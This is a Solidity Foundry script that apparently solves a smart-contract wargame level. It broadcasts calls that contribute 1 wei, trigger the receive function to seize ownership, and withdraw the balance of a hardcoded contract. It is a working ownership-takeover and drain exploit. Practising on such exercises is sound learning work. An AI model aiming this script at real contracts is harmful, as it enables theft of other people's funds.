// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

contract FallBackScript is Script {
    uint256 deployerPrivateKey;
    address public fallBackAddress;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        fallBackAddress = 0xdf4B4bE8dE3fB59fb696765207d60fa36126aA78;
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);
        _attack();
        vm.stopBroadcast();
    }

    function _attack() public {
        // Contribute 1 Wei
        bytes memory contributeCallData = abi.encodeWithSignature("contribute()");
        fallBackAddress.call{value: 1}(contributeCallData);
        // Send Ether to trigger the receive function and change the owner
        // receive function triggered when msg.data is empty
        fallBackAddress.call{value: 1}("");
        // Withdraw fund
        bytes memory withdrawCallData = abi.encodeWithSignature("withdraw()");
        fallBackAddress.call(withdrawCallData);
    }
}
